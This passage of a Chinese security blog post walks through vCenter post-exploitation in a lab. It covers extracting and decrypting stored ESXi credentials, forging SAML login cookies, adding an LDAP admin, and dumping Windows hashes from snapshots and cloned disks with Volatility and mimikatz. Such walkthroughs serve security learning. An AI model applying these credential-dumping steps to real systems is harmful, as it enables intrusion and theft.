class="operator">/</span><span class="operator">/</span><span class="operator">/</span>vmfs<span class="operator">/</span>volumes<span class="operator">/</span><span class="number">620</span>b69fc<span class="number">-146</span>b7e5a<span class="operator">-</span>c350<span class="number">-000</span>c298f19ff<span class="operator">/</span>win7<span class="operator">-</span>liangsan<span class="operator">/</span>win7<span class="operator">-</span>liangsan.vmx   <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span> </span><br><span class="line"> <span class="number">21</span> <span class="operator">|</span>             <span class="number">2</span> <span class="operator">|</span> ds:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>vmfs<span class="operator">/</span>volumes<span class="operator">/</span><span class="number">620</span>b69fc<span class="number">-146</span>b7e5a<span class="operator">-</span>c350<span class="number">-000</span>c298f19ff<span class="operator">/</span>win7<span class="operator">-</span>zhanglili<span class="operator">/</span>win7<span class="operator">-</span>zhanglili.vmx <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span> </span><br><span class="line"> <span class="number">42</span> <span class="operator">|</span>             <span class="number">2</span> <span class="operator">|</span> ds:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>vmfs<span class="operator">/</span>volumes<span class="operator">/</span><span class="number">620</span>b69fc<span class="number">-146</span>b7e5a<span class="operator">-</span>c350<span class="number">-000</span>c298f19ff<span class="operator">/</span>fake<span class="operator">-</span>zhanglili<span class="operator">/</span>fake<span class="operator">-</span>zhanglili.vmx <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span> </span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure>
+
+<p>查询vCenter中配置的ESXI账号密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VCDB<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> name,port,username,password,password_last_upd_dt,product_fullname <span class="keyword">FROM</span> vc.vpxv_hosts;</span><br><span class="line">     name      <span class="operator">|</span> port <span class="operator">|</span> username <span class="operator">|</span>                                         password                                          <span class="operator">|</span>  password_last_upd_dt   <span class="operator">|</span>         product_fullname         </span><br><span class="line"><span class="comment">---------------+------+----------+-------------------------------------------------------------------------------------------+-------------------------+----------------------------------</span></span><br><span class="line"> <span class="number">172.16</span><span class="number">.64</span><span class="number">.142</span> <span class="operator">|</span>  <span class="number">443</span> <span class="operator">|</span> vpxuser  <span class="operator">|</span> <span class="operator">*</span><span class="number">5</span>U2y5stj9v52g0tq1KSfpS5eBnxe1WhsSXoxf1aH<span class="operator">+</span>UrVjhrdDzoT<span class="operator">/</span>Vs3nNZ1SzK<span class="operator">/</span>Xjwy629n4ZuSNU7dTwsfrA<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span> <span class="number">2022</span><span class="number">-02</span><span class="number">-15</span> <span class="number">08</span>:<span class="number">56</span>:<span class="number">06.721</span> <span class="operator">|</span> VMware ESXi <span class="number">6.7</span><span class="number">.0</span> build<span class="number">-15160138</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个账号密码可以用来登录目标ESXI服务器的ssh，解密需要用到文件symkey.dat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows：  C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat</span><br><span class="line">Linux:  /etc/vmware-vpx/ssl/symkey.dat</span><br></pre></td></tr></table></figure>
+
+<p>使用脚本<a target="_blank" rel="noopener" href="https://github.com/shmilylty/vhost_password_decrypt/blob/main/decrypt.py">decrypt.py</a>解密拿到明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 decrypt.py symkey.dat password.enc password.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218175323719.png" alt="image-20220218175323719"></p>
+<p>现在可以用解出来的密码登录ESXI服务器的SSH，但是ESXI服务器默认是没有开启SSH服务的，好在这个账号密码也能用于登录这个ESXI服务器的Web后台，所以我们可以登进ESXI后台开启SSH服务</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218180119617.png" alt="image-20220218180119617"></p>
+<p>至此我们就可以通过SSH连接ESXI服务器(虚拟机的磁盘文件都是存放在ESXI服务器上的，当此类文件过大不便于下载回本地时，我们可以通过本地SSH连上ESXI服务器去操作虚拟机的磁盘或者快照文件)</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218181101677.png" alt="image-20220218181101677"></p>
+<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>对于vCenter这种集中管控系统，单纯的webshell价值不大，核心的东西在管控系统后台，我们需要找一些思路去登录vCenter后台。</p>
+<h4 id="SAML证书"><a href="#SAML证书" class="headerlink" title="SAML证书"></a>SAML证书</h4><p><a target="_blank" rel="noopener" href="https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/">https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/</a></p>
+<p>在vCenter服务器上找到生成Cookie需要用到的数据库文件:</p>
+<ul>
+<li>Linux:</li>
+</ul>
+<p> &#x2F;storage&#x2F;db&#x2F;vmware-vmdir&#x2F;data.mdb</p>
+<ul>
+<li>Windows:</li>
+</ul>
+<p> C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb</p>
+<ul>
+<li>除此以外真实环境中还有存放vCenter备份文件的地方，在lotus_backup.tar.gz文件中也保存有data.mdb</li>
+</ul>
+<p>再使用<a target="_blank" rel="noopener" href="https://github.com/horizon3ai/vcenter_saml_login">脚本</a>生成Cookie</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217153435799.png" class="" title="image-20220217153435799">
+
+<p>直接使用生成的Cookie访问vCenter服务器<a target="_blank" rel="noopener" href="https://172.16.64.143/ui">https://172.16.64.143/ui</a> </p>
+<p>或者可以参考<a target="_blank" rel="noopener" href="https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter-SAML-Certificates">3gstudent的文章</a>，区别就是3gsteudent改的脚本可以直接在目标vcenter上运行。</p>
+<p>先上传<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py">vCenter_ExtraCertFromMdb.py</a> 到目标vcenter服务器上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenter_ExtraCertFromMdb.py /storage/db/vmware-vmdir/data.mdb</span><br></pre></td></tr></table></figure>
+
+<p>生成证书文件</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217170217122.png" class="" title="image-20220217170217122">
+
+<p>然后把cat证书文件复制到本地，然后运行脚本<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py">vCenter_GenerateLoginCookie.py</a>获取Cookie</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217170459926.png" class="" title="image-20220217170459926">
+
+<h4 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h4><ul>
+<li>Linux:</li>
+</ul>
+<p>&#x2F;usr&#x2F;lib&#x2F;vmware-vmdir&#x2F;bin&#x2F;vdcadmintool</p>
+<ul>
+<li>Windows:</li>
+</ul>
+<p> C:\Program Files\VMware\vCenter Server\vmdird\vdcadmintool.exe</p>
+<p>运行程序选择选项3可重制管理员账号密码</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220216215308530-5079501.png" class="" title="image-20220216215308530">
+
+<h4 id="LDAP添加用户"><a href="#LDAP添加用户" class="headerlink" title="LDAP添加用户"></a>LDAP添加用户</h4><p>参考<a target="_blank" rel="noopener" href="https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%975-LDAP">3gstudent师傅文章</a></p>
+<p>可以在目标vCenter服务器直接用脚本<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenterLDAP_Manage.py">vCenterLDAP_Manage.py</a>加管理员用户</p>
+<p>先增加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenterLDAP_Manage.py adduser</span><br></pre></td></tr></table></figure>
+
+<p>例如增加一个<a href="mailto:&#97;&#112;&#112;&#108;&#x65;&#64;&#118;&#x73;&#112;&#x68;&#101;&#114;&#101;&#46;&#108;&#x6f;&#99;&#x61;&#108;">&#97;&#112;&#112;&#108;&#x65;&#64;&#118;&#x73;&#112;&#x68;&#101;&#114;&#101;&#46;&#108;&#x6f;&#99;&#x61;&#108;</a>的用户，username就是用户名随便填，dn这里需要把第一个CN改成前面填写的用户名，然后DC字段与获取到的dcAccountDN一致，userPrincipalName这里就是真正的登录名，也需要与原本的保持一致，大概照着提示填写即可。</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217173645186.png" class="" title="image-20220217173645186">
+
+<p>然后把用户加进管理员组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenterLDAP_Manage.py addadmin</span><br></pre></td></tr></table></figure>
+
+<p>这里直接输入前面加用户的那个dn就行</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217173940621.png" class="" title="image-20220217173940621">
+
+<p>添加完成后就能用新加的管理员账号登入后台了</p>
+<h3 id="获得锁屏机器密码或hash"><a href="#获得锁屏机器密码或hash" class="headerlink" title="获得锁屏机器密码或hash"></a>获得锁屏机器密码或hash</h3><p>假如我们要获取一台锁屏机器win7-zhanglili机器的hash，有哪些思路呢？</p>
+<p>首先是一些Windows底层的思路，也即是网上常见的忘记Windows开机密码那一套</p>
+<h4 id="KON-BOOT"><a href="#KON-BOOT" class="headerlink" title="KON-BOOT"></a>KON-BOOT</h4><p><a target="_blank" rel="noopener" href="https://kon-boot.com/">https://kon-boot.com/</a></p>
+<p>可以通过加载KON-BOOT镜像文件绕过密码登录进入操作系统后台，不过新点的版本要收费。</p>
+<p>将KON-BOOT的iso镜像上传到vcenter中，克隆虚拟机获取目标机器win7-zhanglili的克隆机器fake-zhanglili，将fake-zhanglili的CD&#x2F;DVD处镜像更换成KON-BOOT的iso</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218165450361.png" alt="image-20220218165450361"></p>
+<p>启动虚拟机fake-zhanglili，进入bios(可以选择<strong>启动到固件</strong>这个功能)，把KON-BOOT的镜像文件顺序放到第一位</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218165643596.png" alt="image-20220218165643596"></p>
+<p>再次重启虚拟机进入KON-BOOT，后面一路回车</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218165534426.png" alt="image-20220218165534426"></p>
+<p>等KON-BOOT加载好后重启虚拟机，这时直接空密码就能登录操作系统或者直接用shift后门(5下shift)弹出cmd操作</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218170056733.png" alt="image-20220218170056733"></p>
+<h4 id="PE工具"><a href="#PE工具" class="headerlink" title="PE工具"></a>PE工具</h4><p>类似的，我们也可以利用PE工具绕过开机密码登录操作系统，就互联网上忘记Windows开机密码那一套都可以拿来撸</p>
+<h4 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h4><p>指定目标机器win7-zhanglili生成快照</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217141919199-5079507.png" class="" title="image-20220217141919199">
+
+<p>在数据存储中找到目标机器快照的.vmem文件或者.vmsn文件，下载到本地</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217142039122-5079515.png" class="" title="image-20220217142039122">
+
+<p>使用采证工具volatility可以读明文密码或hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\读取明文密码</span><br><span class="line">volatility_2.6_win64_standalone.exe -f win7-zhanglili-Snapshot1.vmem --profile=Win7SP1x64_23418 lsadump</span><br><span class="line">\\读取hash</span><br><span class="line">volatility_2.6_win64_standalone.exe -f win7-zhanglili-Snapshot1.vmem --profile=Win7SP1x64_23418 hashdump</span><br></pre></td></tr></table></figure>
+
+<p>具体profile值可参考</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles">https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles</a></p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217142155695-5079520.png" class="" title="image-20220217142155695">
+
+
+
+<h5 id="快照文件过大的情景"><a href="#快照文件过大的情景" class="headerlink" title="快照文件过大的情景"></a>快照文件过大的情景</h5><p>如果快照文件很大或者网络带宽有问题，短时间内无法把快照文件下回本地，有无什么思路？</p>
+<p>我们可以利用前面介绍的数据库相关手法控制ESXI服务器，直接在ESXI服务器上的ssh操作快照</p>
+<h4 id="挂载vmdk"><a href="#挂载vmdk" class="headerlink" title="挂载vmdk"></a>挂载vmdk</h4><p>克隆虚拟机win7-zhanglili生成虚拟机fake-zhanglili，克隆后的机器fake-zhanglili保持关机状态。(开机状态机器的vmdk是锁定的，我们无法直接获取到win7-zhanaglili机器的vmdk文件，所以需要通过克隆一个fake-zhanglili机器获取与win7-zhanglili相同的vmdk)</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217143708116.png" class="" title="image-20220217143708116">
+
+
+
+<p>新建虚拟机或者找一台可控虚拟机挂载克隆后虚拟机的vmdk，这里我们利用镜像新建一个虚拟机win7-liangsan</p>
+<p>右键编辑设置，给我们可控的虚拟机win7-liangsan挂载硬盘</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217143518412.png" class="" title="image-20220217143518412">
+
+<p>选择克隆后机器fake-zhanglili的vmdk文件</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217143558114.png" class="" title="image-20220217143558114">
+
+<p>然后我们打开虚拟机xin7-liangsan，可以发现已经挂载成功了</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217144413397.png" class="" title="image-20220217144413397">
+
+<p>然后我们就找相关文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">从sam导本地hash可以尝试</span><br><span class="line">SYSTEM :C:\Windows\System32\config\SYSTEM</span><br><span class="line">SAM :C:\Windows\System32\config\SAM</span><br><span class="line"></span><br><span class="line">如果目标是DC服务器，还可以导出ntds.dit文件读全域hash</span><br><span class="line">NTDS.dit  : C:\Windows\NTDS\NTDS.dit </span><br></pre></td></tr></table></figure>
+
+<p>这里我没搭建DC的环境，演示一下导出本地hash</p>
+<p>这里咱们vcenter创建的虚拟机并不能很随便地和我们本机随意的复制粘贴，所以传输工具文件还有点小麻烦。解决思路大概分两种情况，一种是直接在我们新建的虚拟机win-liangsan上用工具取出hash，另一种思路是把文件拉回我们本地(这里vcenter上的机器装了vmtool也不能直接复制粘贴)</p>
+<h5 id="在虚拟机上导hash"><a href="#在虚拟机上导hash" class="headerlink" title="在虚拟机上导hash"></a>在虚拟机上导hash</h5><p>直接内网找一个我们新建虚拟机能通的机器，在该机器上用python开个简单的web实现文件传输</p>
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217145213714.png" class="" title="image-20220217145213714">
+
+<p>把mimikatz传到我们新建虚拟机win-liangsan中，然后复制SAM和SYSTEM执行mimikatz即可导出本地hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220217145312129.png" class="" title="image-20220217145312129">
+
+<p>PS：或者也可以制造一份存储有工具的vmdk上传到vcenter然后挂载到虚拟机里</p>
+<h5 id="拉到本地"><a href="#拉到本地" class="headerlink" title="拉到本地"></a>拉到本地</h5><h6 id="方法一-激活复制-x2F-粘贴功能"><a href="#方法一-激活复制-x2F-粘贴功能" class="headerlink" title="方法一 激活复制&#x2F;粘贴功能"></a>方法一 激活复制&#x2F;粘贴功能</h6><p>参考<a target="_blank" rel="noopener" href="https://docs.vmware.com/cn/VMware-vSphere/7.0/com.vmware.vsphere.security.doc/GUID-367D02C1-B71F-4AC3-AA05-85033136A667.html">官方文档</a>在ESXI上添加设置，可以开启复制粘贴功能，可以直接复制虚拟机内的文件内容到本地，但是只能复制文件内容且有字符长度限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isolation.tools.copy.disable=false</span><br><span class="line">isolation.tools.paste.disable=false</span><br><span class="line">isolation.tools.setGUIOptions.enable=true</span><br></pre></td></tr></table></figure>
+
+<h6 id="方法二-在我们可控的虚拟机上开启共享文件夹"><a href="#方法二-在我们可控的虚拟机上开启共享文件夹" class="headerlink" title="方法二 在我们可控的虚拟机上开启共享文件夹"></a>方法二 在我们可控的虚拟机上开启共享文件夹</h6><p>把我们需要拉到本地的文件放到一个文件夹中，然后设置该文件夹为共享文件夹，然后从任意能网络通的地方net use连接设置了共享文件夹的虚拟机</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220221112839229.png" alt="image-20220221112839229"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/04/17/Shiro%E8%B6%8A%E6%9D%83%E5%AD%A6%E4%B9%A0/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-04-18 23:36:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-045"><span class="toc-text">S2-045</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21972"><span class="toc-text">CVE-2021-21972</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E7%A7%81%E9%92%A5"><span class="toc-text">写私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-text">写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linuxshell%E8%B7%AF%E5%BE%84"><span class="toc-text">Linuxshell路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E8%B7%AF%E5%BE%84"><span class="toc-text">Windows路径</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21985"><span class="toc-text">CVE-2021-21985</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-text">不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">执行系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E6%89%A7%E8%A1%8Cjava%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">BCEL执行java字节码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-text">出网利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-22005"><span class="toc-text">CVE-2021-22005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CIEP"><span class="toc-text">CIEP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Velocity"><span class="toc-text">Velocity</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#log4j"><span class="toc-text">log4j</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-3156"><span class="toc-text">CVE-2021-3156</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">操作数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">登录后台</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SAML%E8%AF%81%E4%B9%A6"><span class="toc-text">SAML证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="toc-text">重置密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-text">LDAP添加用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E9%94%81%E5%B1%8F%E6%9C%BA%E5%99%A8%E5%AF%86%E7%A0%81%E6%88%96hash"><span class="toc-text">获得锁屏机器密码或hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#KON-BOOT"><span class="toc-text">KON-BOOT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PE%E5%B7%A5%E5%85%B7"><span class="toc-text">PE工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%AB%E7%85%A7"><span class="toc-text">快照</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BF%AB%E7%85%A7%E6%96%87%E4%BB%B6%E8%BF%87%E5%A4%A7%E7%9A%84%E6%83%85%E6%99%AF"><span class="toc-text">快照文件过大的情景</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BDvmdk"><span class="toc-text">挂载vmdk</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E5%AF%BChash"><span class="toc-text">在虚拟机上导hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%89%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-text">拉到本地</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E6%BF%80%E6%B4%BB%E5%A4%8D%E5%88%B6-x2F-%E7%B2%98%E8%B4%B4%E5%8A%9F%E8%83%BD"><span class="toc-text">方法一 激活复制&#x2F;粘贴功能</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%9C%A8%E6%88%91%E4%BB%AC%E5%8F%AF%E6%8E%A7%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E5%BC%80%E5%90%AF%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-text">方法二 在我们可控的虚拟机上开启共享文件夹</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
